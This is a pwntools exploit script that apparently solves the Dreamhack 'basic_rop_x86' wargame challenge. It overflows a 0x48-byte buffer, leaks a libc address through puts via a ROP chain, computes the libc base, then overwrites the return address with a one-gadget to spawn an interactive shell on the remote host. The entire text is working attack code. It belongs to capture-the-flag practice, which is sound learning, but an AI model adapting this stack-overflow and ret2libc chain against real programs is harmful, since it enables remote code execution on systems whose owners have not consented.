from pwn import *
r=remote("host1.dreamhack.games",8261)
#r=process("./basic_rop_x86")
b=ELF("./basic_rop_x86")
libc=ELF("./libc.so.6")
oneshot=0x3a819
context.log_level='debug'

pay=""
pay+='x'*0x48
pay+=p32(b.plt['puts'])
pay+=p32(b.symbols['main'])
pay+=p32(b.got['puts'])
r.sendline(pay)

r.recv(0x48)
libcbase=u32(r.recv(4))-libc.symbols['puts']
log.info(libcbase)
oneshot+=libcbase

pay2=""
pay2+='x'*0x48
pay2+=p32(oneshot)
r.sendline(pay2)
r.interactive()
